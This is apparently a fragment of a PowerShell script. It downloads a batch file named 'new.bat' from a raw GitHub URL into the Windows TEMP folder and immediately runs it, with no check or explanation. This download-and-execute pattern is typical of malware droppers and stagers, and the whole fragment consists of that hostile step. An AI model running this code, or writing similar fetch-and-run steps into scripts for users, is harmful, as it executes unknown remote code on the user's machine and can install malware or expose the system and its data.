$url4 = "https://raw.githubusercontent.com/cia168168/folder/main/new.bat"
$output4 = "$env:TEMP\new.bat"
Invoke-WebRequest -Uri $url4 -OutFile $output4
& $output4